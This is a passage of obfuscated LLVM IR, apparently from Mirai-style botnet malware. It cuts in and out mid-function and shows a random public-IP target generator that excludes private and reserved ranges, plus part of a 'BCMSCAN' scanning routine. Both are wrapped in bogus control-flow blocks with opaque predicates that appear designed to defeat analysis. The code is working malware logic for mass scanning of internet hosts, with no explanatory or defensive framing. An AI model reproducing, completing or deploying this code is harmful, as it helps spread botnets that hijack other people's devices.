  %gen26 = add i64 %_25, %211
  %212 = sub i64 0, %211
  %213 = getelementptr inbounds i8, i8* %209, i64 %212
  %214 = load i8, i8* %213, align 1
  %215 = sext i8 %214 to i32
  %216 = icmp eq i32 %215, 13
  br label %originalBB18

originalBB30alteredBB:                            ; preds = %originalBB30, %138
  %217 = load i32, i32* %15, align 4
  %_31 = sub i32 %217, 1
  %gen32 = mul i32 %_31, 1
  %_33 = sub i32 0, %217
  %gen34 = add i32 %_33, 1
  %_35 = sub i32 0, %217
  %gen36 = add i32 %_35, 1
  %218 = add nsw i32 %217, 1
  store i32 %218, i32* %15, align 4
  br label %originalBB30
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %260, %0
  %15 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %258, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  br i1 %21, label %258, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i32, i32* @x.57
  %24 = load i32, i32* @y.58
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  %31 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 100
  %34 = load i32, i32* @x.57
  %35 = load i32, i32* @y.58
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %33, label %42, label %50

; <label>:42:                                     ; preds = %originalBBpart2
  %43 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp sge i32 %44, 64
  br i1 %45, label %46, label %50

; <label>:46:                                     ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp sle i32 %48, 127
  br i1 %49, label %258, label %50

; <label>:50:                                     ; preds = %46, %42, %originalBBpart2
  %51 = load i32, i32* @x.57
  %52 = load i32, i32* @y.58
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 127
  %62 = load i32, i32* @x.57
  %63 = load i32, i32* @y.58
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %61, label %258, label %70

; <label>:70:                                     ; preds = %originalBBpart24
  %71 = load i32, i32* @x.57
  %72 = load i32, i32* @y.58
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %70
  %79 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 169
  %82 = load i32, i32* @x.57
  %83 = load i32, i32* @y.58
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %81, label %90, label %110

; <label>:90:                                     ; preds = %originalBBpart28
  %91 = load i32, i32* @x.57
  %92 = load i32, i32* @y.58
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %90
  %99 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 254
  %102 = load i32, i32* @x.57
  %103 = load i32, i32* @y.58
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %101, label %258, label %110

; <label>:110:                                    ; preds = %originalBBpart212, %originalBBpart28
  %111 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 172
  br i1 %113, label %114, label %122

; <label>:114:                                    ; preds = %110
  %115 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp sle i32 %116, 16
  br i1 %117, label %118, label %122

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp sle i32 %120, 31
  br i1 %121, label %258, label %122

; <label>:122:                                    ; preds = %118, %114, %110
  %123 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 192
  br i1 %125, label %126, label %150

; <label>:126:                                    ; preds = %122
  %127 = load i32, i32* @x.57
  %128 = load i32, i32* @y.58
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %126
  %135 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 0
  %138 = load i32, i32* @x.57
  %139 = load i32, i32* @y.58
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %137, label %146, label %150

; <label>:146:                                    ; preds = %originalBBpart216
  %147 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 2
  br i1 %149, label %258, label %150

; <label>:150:                                    ; preds = %146, %originalBBpart216, %122
  %151 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 192
  br i1 %153, label %154, label %162

; <label>:154:                                    ; preds = %150
  %155 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 88
  br i1 %157, label %158, label %162

; <label>:158:                                    ; preds = %154
  %159 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %160 = zext i8 %159 to i32
  %161 = icmp eq i32 %160, 99
  br i1 %161, label %258, label %162

; <label>:162:                                    ; preds = %158, %154, %150
  %163 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %164 = zext i8 %163 to i32
  %165 = icmp eq i32 %164, 192
  br i1 %165, label %166, label %170

; <label>:166:                                    ; preds = %162
  %167 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %168 = zext i8 %167 to i32
  %169 = icmp eq i32 %168, 168
  br i1 %169, label %258, label %170

; <label>:170:                                    ; preds = %166, %162
  %171 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 198
  br i1 %173, label %174, label %198

; <label>:174:                                    ; preds = %170
  %175 = load i32, i32* @x.57
  %176 = load i32, i32* @y.58
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %174
  %183 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %184 = zext i8 %183 to i32
  %185 = icmp eq i32 %184, 18
  %186 = load i32, i32* @x.57
  %187 = load i32, i32* @y.58
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %185, label %258, label %194

; <label>:194:                                    ; preds = %originalBBpart220
  %195 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 %196, 19
  br i1 %197, label %258, label %198

; <label>:198:                                    ; preds = %194, %170
  %199 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %200 = zext i8 %199 to i32
  %201 = icmp eq i32 %200, 198
  br i1 %201, label %202, label %210

; <label>:202:                                    ; preds = %198
  %203 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %204 = zext i8 %203 to i32
  %205 = icmp eq i32 %204, 51
  br i1 %205, label %206, label %210

; <label>:206:                                    ; preds = %202
  %207 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 100
  br i1 %209, label %258, label %210

; <label>:210:                                    ; preds = %206, %202, %198
  %211 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 203
  br i1 %213, label %214, label %238

; <label>:214:                                    ; preds = %210
  %215 = load i32, i32* @x.57
  %216 = load i32, i32* @y.58
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %214
  %223 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 0
  %226 = load i32, i32* @x.57
  %227 = load i32, i32* @y.58
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %225, label %234, label %238

; <label>:234:                                    ; preds = %originalBBpart224
  %235 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 113
  br i1 %237, label %258, label %238

; <label>:238:                                    ; preds = %234, %originalBBpart224, %210
  %239 = load i32, i32* @x.57
  %240 = load i32, i32* @y.58
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %238
  %247 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %248 = zext i8 %247 to i32
  %249 = icmp sge i32 %248, 224
  %250 = load i32, i32* @x.57
  %251 = load i32, i32* @y.58
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %258

; <label>:258:                                    ; preds = %originalBBpart228, %234, %206, %194, %originalBBpart220, %166, %158, %146, %118, %originalBBpart212, %originalBBpart24, %46, %18, %14
  %259 = phi i1 [ true, %234 ], [ true, %206 ], [ true, %194 ], [ true, %originalBBpart220 ], [ true, %166 ], [ true, %158 ], [ true, %146 ], [ true, %118 ], [ true, %originalBBpart212 ], [ true, %originalBBpart24 ], [ true, %46 ], [ true, %18 ], [ true, %14 ], [ %249, %originalBBpart228 ]
  br i1 %259, label %260, label %273

; <label>:260:                                    ; preds = %258
  %261 = call i32 @rand() #5
  %262 = srem i32 %261, 223
  %263 = trunc i32 %262 to i8
  store i8 %263, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %264 = call i32 @rand() #5
  %265 = srem i32 %264, 255
  %266 = trunc i32 %265 to i8
  store i8 %266, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %267 = call i32 @rand() #5
  %268 = srem i32 %267, 255
  %269 = trunc i32 %268 to i8
  store i8 %269, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %270 = call i32 @rand() #5
  %271 = srem i32 %270, 255
  %272 = trunc i32 %271 to i8
  store i8 %272, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %14

; <label>:273:                                    ; preds = %258
  %274 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %274, i8 0, i64 16, i32 16, i1 false)
  %275 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %276 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %277 = zext i8 %276 to i32
  %278 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %279 = zext i8 %278 to i32
  %280 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %281 = zext i8 %280 to i32
  %282 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %283 = zext i8 %282 to i32
  %284 = call i32 (i8*, i8*, ...) @szprintf(i8* %275, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.488, i32 0, i32 0), i32 %277, i32 %279, i32 %281, i32 %283)
  %285 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %286 = call i32 @inet_addr(i8* %285) #5
  ret i32 %286

originalBBalteredBB:                              ; preds = %originalBB, %22
  %287 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %288 = zext i8 %287 to i32
  %289 = icmp eq i32 %288, 100
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  %290 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %291 = zext i8 %290 to i32
  %292 = icmp eq i32 %291, 127
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %70
  %293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %294 = zext i8 %293 to i32
  %295 = icmp eq i32 %294, 169
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %90
  %296 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %297 = zext i8 %296 to i32
  %298 = icmp eq i32 %297, 254
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %126
  %299 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %174
  %302 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %303 = zext i8 %302 to i32
  %304 = icmp eq i32 %303, 18
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %214
  %305 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %306 = zext i8 %305 to i32
  %307 = icmp eq i32 %306, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %238
  %308 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %309 = zext i8 %308 to i32
  %310 = icmp sge i32 %309, 224
  br label %originalBB26
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @BCMSCAN() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3 = call i32 @rand() #5
  %4 = srem i32 %3, 255
  %5 = trunc i32 %4 to i8
  store i8 %5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %6 = call i32 @rand() #5
  %7 = srem i32 %6, 255
  %8 = trunc i32 %7 to i8
  store i8 %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %9 = call i32 @rand() #5
  %10 = srem i32 %9, 255
  %11 = trunc i32 %10 to i8
  store i8 %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %12 = call i32 @rand() #5
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %15 = call i32 @rand() #5
  %16 = srem i32 %15, 37
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %26

; <label>:19:                                     ; preds = %0
  %20 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %21 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %22 = zext i8 %21 to i32
  %23 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %24 = zext i8 %23 to i32
  %25 = call i32 (i8*, i8*, ...) @szprintf(i8* %20, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.489, i32 0, i32 0), i32 %22, i32 %24)
  br label %26

; <label>:26:                                     ; preds = %19, %0
  %27 = load i32, i32* %1, align 4
  %28 = icmp eq i32 %27, 1
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %26
  %30 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %31 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %34 = zext i8 %33 to i32
  %35 = call i32 (i8*, i8*, ...) @szprintf(i8* %30, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.490, i32 0, i32 0), i32 %32, i32 %34)
  br label %36

; <label>:36:                                     ; preds = %29, %26
  %37 = load i32, i32* @x.59
  %38 = load i32, i32* @y.60
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i32, i32* %1, align 4
  %46 = icmp eq i32 %45, 2
  %47 = load i32, i32* @x.59
  %48 = load i32, i32* @y.60
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %46, label %55, label %78

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i32, i32* @x.59
  %57 = load i32, i32* @y.60
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %65 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %66 = zext i8 %65 to i32
  %67 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %68 = zext i8 %67 to i32
  %69 = call i32 (i8*, i8*, ...) @szprintf(i8* %64, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.491, i32 0, i32 0), i32 %66, i32 %68)
  %70 = load i32, i32* @x.59
  %71 = load i32, i32* @y.60
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %78

; <label>:78:                                     ; preds = %originalBBpart24, %originalBBpart2
  %79 = load i32, i32* @x.59
  %80 = load i32, i32* @y.60
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %78
  %87 = load i32, i32* %1, align 4
  %88 = icmp eq i32 %87, 3
  %89 = load i32, i32* @x.59
  %90 = load i32, i32* @y.60
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %88, label %97, label %120

; <label>:97:                                     ; preds = %originalBBpart28
  %98 = load i32, i32* @x.59
  %99 = load i32, i32* @y.60
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %97
  %106 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %107 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %108 = zext i8 %107 to i32
  %109 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %110 = zext i8 %109 to i32
  %111 = call i32 (i8*, i8*, ...) @szprintf(i8* %106, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.492, i32 0, i32 0), i32 %108, i32 %110)
  %112 = load i32, i32* @x.59
  %113 = load i32, i32* @y.60
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %120

; <label>:120:                                    ; preds = %originalBBpart212, %originalBBpart28
  %121 = load i32, i32* @x.59
  %122 = load i32, i32* @y.60
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %120
  %129 = load i32, i32* %1, align 4
  %130 = icmp eq i32 %129, 4
  %131 = load i32, i32* @x.59
  %132 = load i32, i32* @y.60
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %130, label %139, label %162

; <label>:139:                                    ; preds = %originalBBpart216
  %140 = load i32, i32* @x.59
  %141 = load i32, i32* @y.60
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %139
  %148 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %149 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %150 = zext i8 %149 to i32
  %151 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %152 = zext i8 %151 to i32
  %153 = call i32 (i8*, i8*, ...) @szprintf(i8* %148, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.493, i32 0, i32 0), i32 %150, i32 %152)
  %154 = load i32, i32* @x.59
  %155 = load i32, i32* @y.60
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %162

; <label>:162:                                    ; preds = %originalBBpart220, %originalBBpart216
  %163 = load i32, i32* %1, align 4
  %164 = icmp eq i32 %163, 5
